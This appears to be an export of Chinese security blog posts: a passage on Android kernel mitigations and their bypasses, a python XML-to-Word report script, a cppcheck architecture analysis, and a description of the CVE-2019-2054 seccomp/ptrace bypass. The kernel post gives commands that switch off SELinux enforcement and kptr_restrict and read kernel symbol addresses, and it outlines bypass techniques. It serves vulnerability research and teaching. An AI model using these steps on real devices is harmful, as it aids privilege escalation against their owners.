1:使用\"%pk\"打印的内核指针被隐藏(以0替换)，除非用户存在CAP_SYSLOG权限。 * 2:所有内核使用\"%pk\"打印的都被隐藏 SEAndroid(MAC)：强制访问控制，比常规自主访问控制(DAC)粒度更细 内核版本3.10~3.18： 页面权限限制 内核代码段不可写(R-W) 内核数据段不可执行(R– or RW-) PXN(Privilege Execute Never)：主要是用来防止内核态执行用户态代码，因为之前的漏洞利用方式是直接劫持内核执行流到用户态的shellcode进行提权，通过该机制有效保护了内核的执行范围。 RKP(内核实时保护，三星KNOX保护) 内核版本4.4+： Post-init read-only：主要用来限制利用vdso布置shellcode的措施，由于之前vdso区域可写，所以有些漏洞利用就通过patch掉这块内存把恶意代码布置到这块内存上来实现shellcode的执行。该机制通过在内核初始化后把该内存区域标记为只读来扩展内核中的现有内存保护。 Hardened usercopy：之前许多漏洞都是因为在使用copy_user时边界检查不严造成的，所以开发人员干脆直接在copy_user类函数内部添加了对拷贝位置和拷贝长度的检查。 PAN(Privileged Access Never)：其主要作用就是防止内核态去访问用户态的数据，成功防止了一些用于绕过PXN机制的技巧，让利用漏洞的难度加大。 KASLR：因为漏洞利用时内核地址十分重要，所以把内核地址变为随机地址会大大增加漏洞利用难度，原理就是在bootloader启动kernel的时候，会通过FDT向内核传入一个seed，在内核启动过程中，kaslr_early_init函数利用这个seed计算出一个random size，然后内核每次加载的基址都会默认在原基址上加上random size。 Integer Overflow Sanitization(整数溢出排除)：一种基于编译器的安全缓解措施，针对算术运算/指令(可能溢出)的检查，以便在实际发生溢出时安全终止进程，该类排错程序可以减少整数溢出导致的各种内存损坏和信息泄露。 Control Flow Integrity(控制流完整性)：一种基于编译器的安全缓解措施，避免攻击者利用漏洞时使用代码复用技巧(ROP/JOP)，控制流完整性实现了将原始程序的控制流限制在编译时确定的有效目标的调用图中。跳转之前先验证下目标地址是否为合法的地址，否则内核崩溃。 感觉最好的缓解机制还是减少攻击面和增加访问控制：减少攻击面的好处让攻击者在受限的范围内寻找漏洞，增加访问控制后(SELinux，DAC权限控制，Capabilities)使大多数漏洞在利用时都受到了限制，无法直接进行提权。解决问题最好的办法就是解决提出问题的。 缓解措施绕过技巧 Kernel Address Display Restriction/dmesg restrictions:1.利用信息泄露漏洞获取内核地址2.通过直接在内存空间搜索kptr_restrict地址，关闭Kernel Address Display Restriction2.1:在kernel\\sysctl.c文件中存在对kptr_restrict的sysctl结构体初始化操作，我们可以通过内存遍历获取到kptr_restrict符号的地址，然后修改为0，这样就关闭了kptr_restrict保护机制 SEAndroid：1.selinux_enforcing,selinux_enable设置为0直接关闭2.修改reset_security_ops() RKP(内核实时保护机制-三星设备KNOX保护)1.Bypassing KNOX PXN(Privilege Execute Never): 1.使用rop/jop等代码重用技巧绕过PXN，改写addr_limit的值，破除本进程的系统调用access_ok校验，实现对内核的任意读写。 2.Ret2dir/Physmap：通过把shellcode布局到合规的地址，从而进行提权。 Kaslr：利用信息泄露类漏洞 PAN：任意读写类漏洞可绕过PAN保护。 CFI：* 一些攻击面 常规攻击面包括浏览器，系统自带服务，第三方应用程序，应用升级相关：某些应用在升级时未对下载的升级包做验证，攻击者就可以替换官方升级包为恶意应用，这样最终安装的就是攻击者指定的应用，工程模式， USSD指令：使用手机拨号输入一些预先制定的数字或者符号比如*#等，可能触发一些手机设备预留的后门操作。媒体和文档处理：一些应用在对文件处理时可能考虑的不够完善，导致处理一些畸形文件时出现问题。 无线通信相关GPS，基带，蓝牙，Wi-Fi，NFC。 本地的攻击面有linux系统调用，网络套接字协议，进程间的通讯，进程间内存共享以及第三方硬件驱动，bootloader。 物理攻击面有直接对设备进行拆解以后，可能存在暴露的串口允许接受调试信息，暴露的JTAG调试端口允许对设备进行调试。 漏洞相关最后来看两个比较有趣的提权漏洞的利用细节，首先是我们如何获取最新的漏洞信息，接着是拿到了漏洞以后如何确定漏洞是否可以利用，在可以利用的情况下如何利用，帮助大家构建一个学习Android漏洞的系统体系。 分析漏洞流程获取漏洞信息漏洞的获取对于漏洞的获取可以关注一些公众号比如玄武实验室的每日公告，天融信阿尔法实验室的每日公告，还有许多公众号都不错。但是一般这些公众号都会在固定的时候发。一般如果出了比较厉害的漏洞或一些新技术都会很快在各大社交应用中传播，所以平时我们还可以多关注一些国内外大佬的推特，微博，还有就是每个月的Google的Android安全公告。如果我们想早于别人之前获取漏洞信息那么我们可以关注一些首发网站，比如bugs.chromium.org这网站我感觉挺不错的，会公布一些漏洞细节，并且还挺详细。还有Android内核补丁网站和Linux内核补丁网站获取最新的补丁信息，可以通过补丁信息推测出一些相关类型的漏洞或者通过补丁分析获取一些被偷偷修补了的洞。最后就是通过结交一些相关领域的朋友组成自己的小圈子，很多消息都在一些小圈子中飞，提高自己的信息获取能力。 通过crash log定位内核异常当我们有了该漏洞的poc以后我们可以找一个测试机，然后在测试机上跑一下看能否崩溃，如果可以崩溃接下来就去获取崩溃日志，然后分析崩溃日志根据日志定位到崩溃代码的位置，也有可能崩溃的地方与实际漏洞的位置不在一处或者多次运行崩溃的地址都不一样，这就需要根据实际的情况详细分析了，对于内存相关的漏洞我们可以使用开启了KASAN选项的测试机，这样崩溃时内核给我们的信息会更多一些。 常见的几个崩溃日志文件cat /sys/fs/pstore/console-ramoopscat /proc/last_kmsgcat /proc/kmsg 获取内核函数的地址echo 0&gt; /sys/fs/selinux/enforceecho 0 &gt; /proc/sys/kernel/kptr_restrictcat /proc/kallsyms |grep ptmx_fops 漏洞分析方法静态分析-&gt;解包固件并分析内核内核镜像分析获取固件的方式分为两种一种是在网上找相应版本的固件包获取镜像，一种是直接dump当前手机的内核镜像。由于第二种需要root权限，所以第一种最方便也最简单，但是这里主要说下第二种，首先我们需要一个带root的手机，通过adb shell连接手机，然后使用以下命令把手机中包含内核的镜像dump出来，路径可能不一样，一般都在/dev/block/platform/目录下，多找几层就能看到。1234567891011121314151617181920212223bullhead:/ # ls -l /dev/block/platform/soc.0/f9824900.sdhci/by-name/lrwxrwxrwx 1 root root 21 1970-08-04 08:13 DDR -&gt; /dev/block/mmcblk0p28lrwxrwxrwx 1 root root 20 1970-08-04 08:13 aboot -&gt; /dev/block/mmcblk0p8lrwxrwxrwx 1 root root 21 1970-08-04 08:13 abootbak -&gt; /dev/block/mmcblk0p14lrwxrwxrwx 1 root root 21 1970-08-04 08:13 apdp -&gt; /dev/block/mmcblk0p17lrwxrwxrwx 1 root root 21 1970-08-04 08:13 boot -&gt; /dev/block/mmcblk0p37 /*------------boot 当前内核进行指向/dev/block/mmcblk0p37---------------*/lrwxrwxrwx 1 root root 21 1970-08-04 08:13 cache -&gt; /dev/block/mmcblk0p40[...]lrwxrwxrwx 1 root root 21 1970-08-04 08:13 vendor -&gt; /dev/block/mmcblk0p39bullhead:/ # dd if=/dev/block/mmcblk0p37 of=/data/local/tmp/boot.img65536+0 records in65536+0 records out33554432 bytes transferred in 0.575 secs (58355533 bytes/sec)bullhead:/ # ls -l /data/local/tmp/boot.img-rw------- 1 root root 33554432 2018-02-28 14:26 /data/local/tmp/boot.imgbullhead:/ # chmod 755 /data/local/tmp/boot.imgbullhead:/ # ls -l /data/local/tmp/boot.img-rwxr-xr-x 1 root root 33554432 2018-02-28 14:26 /data/local/tmp/boot.imgbullhead:/ # exitbullhead:/ $ exitC:\\Users\\Administrator&gt;adb pull /data/local/tmp/boot.img/data/local/tmp/boot.img: 1 file pulled. 9.1 MB/s (33554432 bytes in 3.518s)C:\\Users\\Administrator&gt; OK，可以看到我们成功dump了boot进行，但这不是我们最终的内核，我们还需要使用linux下的abootimg工具对该镜像做解包处理才能获取我们最终的镜像。命令如下1abootimg -x boot.img 该命令会把我们dump出来的boot.img解包，会生成几个文件，我们只需要其中的zImage文件就行，它有时候是一个zip包，直接通过解压工具就能解开，解开以后我们把最终的内核丢到IDA中直接就可以分析了。通过前面我们定位到的崩溃地址和获取的函数符号地址，就可以在IDA中分析当时内核执行时上下文了。 源码分析我们还可以使用SourceInsight进行内核的源码分析，分析源码之前我们首先需要下载源码Android官方源码，然后再创建一个SourceInsight项目把前面下载的源码导入到该项目中即可，导入后可能需要一些时间同步函数之间的调用关系，要不了多长时间。感觉SourceInsight用来读源码还是挺好用的。还有一个understand工具用来分析源码也挺方便的，它可以列出目标函数的调用栈，在写poc的时候挺好用的。 动态分析-&gt;GDB调试模拟器动态调试大概流程如下：1.首先我们需要创建一个emulator模拟器，然后启动该模拟器，获取该模拟器的内核版本。2.确定内核版本以后就去下载相应的android内核，并编译该源码。123456789101164位编译配置export ARCH=arm64export SUBARCH=arm64export CROSS_COMPILE=/home/ubuntu/Desktop/work/source/kernel/android-ndk-r10e/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64/bin/aarch64-linux-android-make menuconfig32位编译配置export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=/home/ubuntu/Desktop/work/source/kernel/arm-eabi-4.6/bin/arm-eabi-make goldfish_armv7_defconfig 3.内核编译完毕后使用我们编译的内核去启动第一步的模拟器。1emulator -kernel /work/kernel/goldfish/arch/arm/boot/zImage -show-kernel -verbose -avd 模拟器名 -qemu -s -S 4.启动成功后内核会暂停等待GDB连接，注意在连接内核之前先用GDB加载前面编译出来的vmlinux，这样才能实现对源码的调试。12aarch64-linux-android-gdb ./vmlinuxtarget remote localhost:1234 5.开始GDB单步调试 提权漏洞实例讲解CVE-2017-7533CVE-2018-9568总结“With great power comes great responsibility” — Uncle Ben Parker 参考android系统完整性校验验证启动 检测root的方法Android root检测方法小结Root检测与反检测 防护机制文章https://lwn.net/Security/Index/Linux内核自防护项目的初始文稿Android O 内核加固与缓解机制深入理解SELinux SEAndroidAndroid 内核控制流完整性Android OAndroid PControl Flow Integrity in the Android kernel 绕过相关文章给shellcode找块福地-通过VDSO绕过PXNAndroid PXN绕过技术研究PXN防护技术的研究与绕过Android Kernel Security","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"python自动化生成Word报告","slug":"python自动化生成Word报告","date":"2019-04-28T16:51:05.000Z","updated":"2019-04-28T17:06:26.874Z","comments":true,"path":"2019/04/29/python自动化生成Word报告/","link":"","permalink":"http://github.com/2019/04/29/python自动化生成Word报告/","excerpt":"","text":"python自动化生成Word报告 前言这里简单记录下如何使用python脚本去解析一个xml文件并把解析出来的数据以变量的形式插入到docx文件。这样做的主要原因是在工作中需要把某些工具的输出结果(.xml文件)转为docx文件并以报告的形式输出。一般这种报告都存在某种固定的格式，只是一些数据是需要动态填入的。所以我们可以把这些需要动态填入的字段以变量的形式表示，然后通过python脚本解析xml文件并把数据插入到以变量表示的字段处，最后生成最终文档。这样我们就不用做一些无趣的复制粘贴工作，大大提高了工作效率。 XML解析首先第一步，通过python如何解析一个xml文件？目前我知道的有2种方法。1.通过python标准库SAX(simple API for XML)解析器解析。SAX用事件驱动模型，通过在解析XML的过程中触发一个个事件并调用用户定义的回调函数来处理XML文件，这种方法解析XML的好处就是以流式读取XML文件比较快，并且占内存少，但需要用户定义回到函数。2.通过DOM(Document Object Model)方式将XML文件载入到内存中，并解析为一棵树的形式，通过对树的操作来实现解析XML文件。这种方式由于需要把XML数据全部映射到内存中，所以会比较慢，并且比较耗内存。但感觉比SAX要灵活。 使用SAX解析XML1.SAX是基于事件驱动实现的，利用SAX解析XML文档会涉及到两个部分：解析器和事件处理器。解析器负责解析XML文件，并在关键时候向事件处理器发送时间比如在元素开始或元素结束时。时间处理器则负责对接收到的事件做响应，主要是调用用户注册的回调函数。以下列出一些比较关键的函数：1.文档启动时：startDocument()方法2.到达文档结尾时：endDocument()方法3.遇到XML开始标签时：startElement(name，attrs)方法4.遇到XML结尾标签时：endElement(name)方法5.创建新的解析器对象：make_parser()方法6.创建一个SAX解析器并解析XML文档：parser()方法实例：目标XML文件123456789101112131415161718192021222324252627282930&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;results version=\"2\"&gt; &lt;errors&gt; &lt;error id=\"arrayIndexOutOfBounds\" severity=\"error\" msg=\"Array &amp;apos;a[10]&amp;apos; accessed at index 10, which is out of bounds.\" verbose=\"Array &amp;apos;a[10]&amp;apos; accessed at index 10, which is out of bounds.\" cwe=\"119\"&gt; &lt;location file=\" /cpp/arrayindexoutofbounds.cpp\" line=\"11\" info=\"Array index out of bounds\"/&gt; &lt;location file=\" /cpp/arrayindexoutofbounds.cpp\" line=\"7\" info=\"Assignment &amp;apos;max=10&amp;apos;, assigned value is 10\"/&gt; &lt;symbol&gt;a&lt;/symbol&gt; &lt;/error&gt; &lt;error id=\"returnDanglingLifetime\" severity=\"error\" msg=\"Returning pointer to local variable &amp;apos;sz&amp;apos; that will be invalid when returning.\" verbose=\"Returning pointer to local variable &amp;apos;sz&amp;apos; that will be invalid when returning.\" cwe=\"562\"&gt; &lt;location file=\" /cpp/autovar.cpp\" line=\"5\"/&gt; &lt;location file=\" /cpp/autovar.cpp\" line=\"3\" info=\"Variable created here.\"/&gt; &lt;location file=\" /cpp/autovar.cpp\" line=\"5\" info=\"Array decayed to pointer here.\"/&gt; &lt;/error&gt; &lt;error id=\"bufferAccessOutOfBounds\" severity=\"error\" msg=\"Buffer is accessed out of bounds: sz\" verbose=\"Buffer is accessed out of bounds: sz\"&gt; &lt;location file=\" /cpp/bufferaccessoutofbounds.cpp\" line=\"5\"/&gt; &lt;symbol&gt;sz&lt;/symbol&gt; &lt;/error&gt; &lt;error id=\"nullPointer\" severity=\"error\" msg=\"Null pointer dereference\" verbose=\"Null pointer dereference\" cwe=\"476\"&gt; &lt;location file=\" /cpp/nonthreadsafefunc.cpp\" line=\"5\" info=\"Null pointer dereference\"/&gt; &lt;/error&gt; &lt;error id=\"resourceLeak\" severity=\"error\" msg=\"Resource leak: pFile\" verbose=\"Resource leak: pFile\" cwe=\"775\"&gt; &lt;location file=\" /cpp/resourceleak.cpp\" line=\"8\"/&gt; &lt;symbol&gt;pFile&lt;/symbol&gt; &lt;/error&gt; &lt;error id=\"stlOutOfBounds\" severity=\"error\" msg=\"When ii==foo.size(), foo[ii] is out of bounds.\" verbose=\"When ii==foo.size(), foo[ii] is out of bounds.\" cwe=\"788\"&gt; &lt;location file=\" /cpp/stloutofbounds.cpp\" line=\"7\"/&gt; &lt;symbol&gt;foo&lt;/symbol&gt; &lt;/error&gt; &lt;/errors&gt;&lt;/results&gt; 解析脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python# -*- coding: UTF-8 -*-import xml.sax # 需要先导入xml.sax库class XMLHandler(xml.sax.ContentHandler): def __init__(self): self.CurrentData = \"\" self.location = \"\" self.symbol = \"\" def startElement(self,tag,attributes): self.CurrentData = tag if tag == \"error\": print \"\\n\\n\\n********** error **********\" XMLHandler.echoInfo(self,\"id\",attributes,\"id:\") XMLHandler.echoInfo(self,\"severity\",attributes,\"severity:\") XMLHandler.echoInfo(self,\"msg\",attributes,\"msg:\") XMLHandler.echoInfo(self,\"verbose\",attributes,\"verbose:\") XMLHandler.echoInfo(self,\"cwe\",attributes,\"cwe:\") if tag == \"location\": XMLHandler.echoInfo(self,\"file\",attributes,\"location.file:\") XMLHandler.echoInfo(self,\"line\",attributes,\"location.line:\") XMLHandler.echoInfo(self,\"info\",attributes,\"location.info:\") # def characters(self,content):# if self.CurrentData == \"location\":# file = content[\"file\"]# print \"location.file:\",file# elif self.CurrentData == \"symbol\":# self.symbol = content# def endElement(self,tag):# if self.CurrentData == \"location\":# print \"location:\",self.location# elif self.CurrentData == \"symbol\":# print \"symbol:\",self.symbol def echoInfo(self,tag,attributes,str): if tag in attributes: data = attributes[tag] print str,data else: print str + \" None\"if( __name__ == \"__main__\"): parser = xml.sax.make_parser() # 创建一个XMLReader parser.setFeature(xml.sax.handler.feature_namespaces,0) Handler = XMLHandler() parser.setContentHandler(Handler) parser.parse(\"log.xml\") # 解析目标xml 输出12345678910111213141516171819202122********** error **********id: arrayIndexOutOfBoundsseverity: errormsg: Array 'a[10]' accessed at index 10, which is out of bounds.verbose: Array 'a[10]' accessed at index 10, which is out of bounds.cwe: 119location.file: /cpp/arrayindexoutofbounds.cpplocation.line: 11location.info: Array index out of boundslocation.file: /cpp/arrayindexoutofbounds.cpplocation.line: 7location.info: Assignment 'max=10', assigned value is 10[................................skip...................................]********** error **********id: stlOutOfBoundsseverity: errormsg: When ii==foo.size(), foo[ii] is out of bounds.verbose: When ii==foo.size(), foo[ii] is out of bounds.cwe: 788location.file: /cpp/stloutofbounds.cpplocation.line: 7location.info: None 使用DOM解析XML文本对象模型(Document Object Model)：一个DOM解析器在解析XML文件时需要把整个XML文件一次性载入到内存中，把文档中所有元素都保存在内存中的一棵树结构中，后续可以通过DOM提供的API去解析这颗树，通过不同的函数来读取或修改文档中的内容，这样做的一个缺点就是比较耗内存。实例：同样的目标，不同的解析1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python# -*- coding: UTF-8 -*-from xml.dom.minidom import parseimport xml.dom.minidom# 通过minidom解析器打开目标XML文件DOMTree = xml.dom.minidom.parse(\"log.xml\")collection = DOMTree.documentElementif collection.hasAttribute(\"errors\"): print \"Root element: %s\" % collection.getAttribute(\"errors\") # 获取所有元素error = collection.getElementsByTagName(\"error\")for err in error: print \"********* error **********\" if err.hasAttribute(\"id\"): print \"id: %s\" % err.getAttribute(\"id\") if err.hasAttribute(\"severity\"): print \"severity: %s\" % err.getAttribute(\"severity\") if err.hasAttribute(\"msg\"): print \"msg: %s\" % err.getAttribute(\"msg\") if err.hasAttribute(\"verbose\"): print \"verbose: %s\" % err.getAttribute(\"verbose\") if err.hasAttribute(\"cwe\"): print \"cwe: %s\" % err.getAttribute(\"cwe\") location = err.getElementsByTagName(\"location\") for loc in location: if loc.hasAttribute(\"file\"): print \"file: %s\" % loc.getAttribute(\"file\") else: print \"file: \" + 'null' if loc.hasAttribute(\"line\"): print \"line: %s\" % loc.getAttribute(\"line\") else: print \"line: \" + 'null' if loc.hasAttribute(\"info\"): print \"info: %s\" % loc.getAttribute(\"info\") else: print \"info: \" + 'null' 输出12345678910111213141516171819202122********* error **********id: arrayIndexOutOfBoundsseverity: errormsg: Array 'a[10]' accessed at index 10, which is out of bounds.verbose: Array 'a[10]' accessed at index 10, which is out of bounds.cwe: 119file: /cpp/arrayindexoutofbounds.cppline: 11info: Array index out of boundsfile: /cpp/arrayindexoutofbounds.cppline: 7info: Assignment 'max=10', assigned value is 10[..................................skip......................................]********* error **********id: stlOutOfBoundsseverity: errormsg: When ii==foo.size(), foo[ii] is out of bounds.verbose: When ii==foo.size(), foo[ii] is out of bounds.cwe: 788file: /cpp/stloutofbounds.cppline: 7info: null Word报告自动生成这里需要使用python的一个库(docxtpl),该库可以按指定的word模板填充内容设定好的符号字段，一般用来把一些工具跑出的结果填充到word模板中完成工作报告的生成。首先通过以下命令安装该第三方库：1pip install docxtpl 使用：WORD模板文件： Python脚本文件：1234567891011121314151617181920212223#!/usr/bin/python# -*- coding: UTF-8 -*-import timefrom docxtpl import DocxTemplate, InlineImageclass CreateDocx(): def __init__(self,TemplateFileName,NewFileName): self.TemplateFileName = TemplateFileName self.NewFileName = NewFileName def post(self): tpl = DocxTemplate(self.TemplateFileName) # 加载模板文件 localtime = time.asctime( time.localtime(time.time())) context = &#123;'date_1':localtime,'version_1':'v1.0','total_1':'0xFFFF','error_1':'0xFFFF','warning_1':'0xFFFF','style_1':'0xFFFF'&#125; tpl.render(context) # 填充数据 tpl.save(self.NewFileName + '_' + str(time.time()) + '.docx') # 保存目标文件 def writeData(self): passif( __name__ == \"__main__\"): Docx = CreateDocx('./CodeScan.docx','CodeScan'); Docx.post(); WORD结果文件： 总结简单记录下，不然感觉自己每天都不知道干了些啥。唉。。。。。。。。。完整的SAX API链接：https://docs.python.org/3/library/xml.sax.html完整的DOM API链接：https://docs.python.org/3/library/xml.dom.html","categories":[{"name":"python脚本","slug":"python脚本","permalink":"http://github.com/categories/python脚本/"}],"tags":[{"name":"python脚本","slug":"python脚本","permalink":"http://github.com/tags/python脚本/"}]},{"title":"代码审计之CppCheck","slug":"代码审计之CppCheck","date":"2019-04-21T16:10:46.000Z","updated":"2019-04-21T16:40:17.540Z","comments":true,"path":"2019/04/22/代码审计之CppCheck/","link":"","permalink":"http://github.com/2019/04/22/代码审计之CppCheck/","excerpt":"","text":"代码审计之CppCheck 前言这段时间由于工作原因需要实现一款源代码分析工具，在网上搜刮了一波发现一款名叫cppcheck的源代码工具挺不错。还有一款叫TscanCode的也蛮好不过是基于cppcheck写的，并且最后的更新在18年，而cppcheck最近还在更新，所以就选择直接分析cppcheck的整体架构。首先我们来了解一下什么是cppcheck，它是一款对于C/C++代码做静态扫描工具，力求发现源码中存在的一些漏洞，目前支持以下几种类型规则的扫描(只是简单列出一些,还有许多感兴趣的可以下载看看)：1234561.空指针检查，包含可疑的空指针，判空后解引用等共3类subid检查。2.数据越界，Sprintf_S越界共1类subid检查。3.内存泄漏，分配和释放不匹配同1类的subid检查。4.逻辑错误，重复的代码分支，bool类型和int类型比较，表达式恒等或恒不等共18类检查。5.可疑代码检查，if判断中含可疑=号，自由变量返回局部变量共15类检查。6.运算错误，判断无符号数小于0，对bool类型进行++自增等，共11类检查。 架构分析分析开源软件我们首先要了解这个软件的整体架构，这里我打算先从文件结构入手。cppcheck总共分为两个模块，我叫它为前端模块，核心模块。前端模块主要通过对用户的输入(命令行)做分析，得到用户想要的选项，然后把这些选项保存到一个Setting类中。然后解析用户需要分析的文件路径，如果该路径属于一个目录则遍历获取该目录下的所有符合的文件作为目标，保存起来用作后续的分析，如果用户直接给出了目标路径那么直接用就行。完成对目标文件列表的获取之后通过循环遍历把单个文件传给核心模块进行源码分析，分析完成后生成AST（抽象语法树）和符号数据库，利用内置的检测方案类挨个对该符号数据库做模型匹配检查，如果存在相同则判定存在漏洞，通过日志输出模块返回给用户。不断遍历直到所有文件都检查完毕。如果后续需要添加别的检测也挺方便，直接按照原有检测类的格式写一个自己的类就行。 各个类的含义 公共模块 Settings::[字段用来存放用户的选项] ErrorLogger::class[基类:输入输出模块] 前端处理模块(处理用户参数) CppCheckExecutor::class[结合CmdLineParse类初始化Settings类中的成员选项，获取检测文件列表，循环调用CppCheck类的检测接口对文件做检测操作] CmdLineParse::class[解析命令行参数,初始化Settings类成员] ThreadExecutor::class[多线程类,多线程检测] 中间处理模块 &lt;- 日志输出模块 CppCheck::class[负责对前端模块传入的文件做符号化处理,生成语法树,符号数据库,调用后端检测模块] Token::class[对目标文件做简单的分词处理,生成单个token] TokenList::class[一个tokenlist表示一个检测文件,由多个token构成] Preprocess::class[预处理类] Tokenizer::class[更复杂的tokenlist结果，用来生成语法树,数据库列表]数据模块 SymbolDatabase::class[符号数据库类，记录程序中所有变量，函数范围，类和结构体范围等信息] 后端处理模块(负责检查) check::class[所有检测类的基类] check**:class….[各种检测类，继承check] 大概流程一:前端模块 1.解析命令行初始化Settings类 2.加载内置cfg配置文件 3.获取检查文件列表 4.循环遍历检查文件传入给核心模块 二:核心模块 1.对前端传入的文件名做基础检查 2.词法分析以及预处理 2.1.通过simplecpp::TokenList的初始化对源文件做词法分析生成tokens1 2.2.通过preprocessor.loadFiles获取源文件的头文件,并对非系统库头文件做分词处理 2.3.预处理token:删除注释,处理asm指令,替换宏操作(removeComments &amp;&amp; setDirectives &amp;&amp; 3.语法分析，生成Tokenizer实例 3.1.整合前面的词法树，建立token双向链表(mTokenizer.createTokens) 4.建立语法树，建立符号数据库(simplifyTokens1) 4.1.第一次简化token双向列表,各种检查,删除一些没用的token:(Tokenizer::simplifyTokenList1) 4.2.创建Ast语法树(createAst) 4.3.验证Ast语法树(validateAst) 4.5.创建符号数据库(createSymbolDatabase) 4.6.设置token列表中的类型(setValueTypeInTokenList) 5.遍历调用检测类注册的所有runcheck函数(checkNormalTokens) 6.二次简化(Tokenizer::simplifyTokenList2) 6.1.首先删除Ast语法树和符号数据库(deleteSymbolDatabase &amp;&amp; clearAst()) 6.2.对tokenlist各种优化(删除各种没用的冗余代码，变量简化，运算简化) 6.3.创建Ast语法树并验证(createAst &amp;&amp; validateAst) 6.4.创建符号数据库(createSymbolDatabase) 7.遍历调用检测类注册的所有runSimplifiedChecks函数(checkSimplifiedTokens) 三:检测模块 1.调用各模块的检测函数 结果会通过ErrorLogger类输出到控制台(也可以指定选项写入到xml文件中)。这里只是列了个大概流程还有许多编译原理的操作后续再研究研究。 方案分析12345678void f1(const char buf[]) &#123; char c = buf[4];&#125;void f2() &#123; char x[2]; f1(x);&#125; 案例比较简单，大概的思路如下：1.1.遍历所有函数(f1,f2)1.2.获取每个函数所有变量定义并过滤掉不是数组定义的变量1.3.通过ArrayInfo类记录每个数组定义的信息((数组元素个数,数组声明id等一系列信息))到arrayInfos列表中1.4.对该函数(f1)中所有数组(arrayInfos)的使用做检查1.5.检查到f1(x);这句时会发现这是把x数组做函数形参的使用，然后获取f1函数的信息1.6.根据调用时形参x在参数列表中的索引,获取f1函数定义时对应索引的实参buf1.7.遍历f1函数的操作，判断buf在该范围内的使用,如果属于[]取值操作则判断[B]中的数值B是否大于等于arrayInfos中保存的x数组定义时的值，如果大于则输出arrayIndexOutOfBoundsError信息1234Checking G:\\test.c ...[G:\\test.c:2]: (style) Variable 'c' is assigned a value that is never used.[G:\\test.c:7] -&gt; [G:\\360work\\代码审计项目\\test.c:2]: (error) Array 'x[2]' accessed at index 4, which is out of bounds.[G:\\test.c:5]: (style) The function 'f2' is never used. 总结分析开源软件时首先确定几个关键函数(关键点)，搞明白程序大概流程。然后再根据实际需求或对感兴趣的点向下扩展做详细分析。感觉从一开始就一个函数一个函数的调太慢了。不知道有没有什么快速分析的方法。什么样的算是关键函数呢?（顶层函数??）像剥洋葱一样一层一层的剥开。 阅读总结1.先了解系统架构与行为模式，再细读。2.阅读代码在于了解全貌而非细节。3.从上而下理清楚架构，便于轻易理解组成关系。4.根据需要了解细度，再决定展开层数。5.在需要了解任何片段代码细节实现时，能很快在大脑中对应到具体的代码位置，才是继续细度代码的时机。 参考https://wenku.baidu.com/view/b6a94afbaaea998fcd220e4b.html 架构分析https://wenku.baidu.com/view/7d9804c7bb4cf7ec4afed0aa.html 架构分析(cppcheck的整体架构)https://wenku.baidu.com/view/018b5a35a32d7375a41780ab.html 方案分析(cppcheck检查项的实现)https://wenku.baidu.com/view/f2d913345a8102d276a22fc2.html 方案规则书写","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://github.com/categories/漏洞挖掘/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://github.com/tags/漏洞挖掘/"}]},{"title":"CVE-2019-2054","slug":"CVE-2019-2054","date":"2019-04-09T17:55:46.000Z","updated":"2019-04-11T18:06:41.516Z","comments":true,"path":"2019/04/10/CVE-2019-2054/","link":"","permalink":"http://github.com/2019/04/10/CVE-2019-2054/","excerpt":"","text":"CVE-2019-2054 前言漏洞信息 实验环境：pixel2(内核版本4.4，安全补丁2019-04-05) 漏洞类型：TOCTOU(timer-of-check-time-of-use) 漏洞描述：在内核版本4.8之前，因为ptrace可以修改子进程进行系统调用时的syscall的调用号，而seccomp对系统调用的检查位于ptrace修改代码之前，这就可以通过ptrace来绕过seccomp对一些系统调用的检查，这可以配合一些漏洞进行提权操作。 调用链：syscall_trace_enter-&gt;secure_computing-&gt;__secure_computing-&gt;seccomp_phase1 漏洞原理漏洞原理这里简单记录下最近看的一个漏洞(CVE-2019-2054)，漏洞发生在版本小于4.8的内核中的一个TOCTOU(timer-of-check-time-of-use)漏洞，被ptrace之后的进程可以绕过seccomp对系统调用的检查(当seccomp把安全系统调用检查之后被ptrace把这个系统调用替换为被过滤的调用，这使得seccomp前面的检查就没有意义了)。所以这些旧版本的内核中开启seccomp的进程就不应该具有使用ptrace的能力。避免恶意进程使用ptrace对seccomp过滤进行逃逸。在android系统中zygote程序将seccomp沙箱应用在system_server和所有的app进程中，并且这个seccomp沙箱允许使用ptrace函数这刚好满足这个漏洞所需的要求。 漏洞造成的影响通过这个漏洞可以实现对seccomp沙箱的绕过，从而调用一些系统限制我们调用的系统调用。增加了攻击面，结合别的漏洞可用做权限提升。 漏洞利用seccomp机制既然该漏洞功能是绕过seccomp沙箱那么我们首先来看下什么是seccomp沙箱seccomp是secure computing的缩写，是linux kernel从2.6.23版本中引入的一种简洁的sandboxing机制。由于linux中大量的系统调用直接暴露给用户程序。但并不是所有系统调用都会用到，所以一些不安全的代码滥用系统调用会对系统造成安全威胁。seccomp机制能使进程进入一种”安全”运行模式。首先如果我们要使用该机制，需要在内核编译时开启以下几个选项，这样在启动后的系统中就能使用seccomp机制了。123CONFIG_SECCOMP=yCONFIG_HAVE_ARCH_SECCOMP_FILTER=yCONFIG_SECCOMP_FILTER=y seccomp总共分为3种模式分别用0,1,2表示： 0.尚未启动seccomp 1.启动seccomp沙箱”STRICT”模式 2.启动seccomp沙箱”FILTER”模式 查看当前进程所使用的seccomp模式有2种方法。1.通过/proc/&lt;pid&gt;/status文件中的Seccomp字段来确定当前进程属于哪种模式。2.通过prctl函数使用PR_GET_SECCOMP选项获取，返回值则是。再来看看”STRICT”与”FILTER”两种模式有什么不同。首先是”STRICT”模式，该模式下只能调用4种系统调用即read,write,exit,sigreturn，如果调用其他不允许的系统调用则进程会收到SIGKILL信号而被终止运行。用户程序中开启”STRICT”模式的方法：121.prctl(PR_SET_SECCOMP,SECCOMP_MODE_STRICT);2.seccomp(SECCOMP_SET_MODE_STRICT,0,NULL); 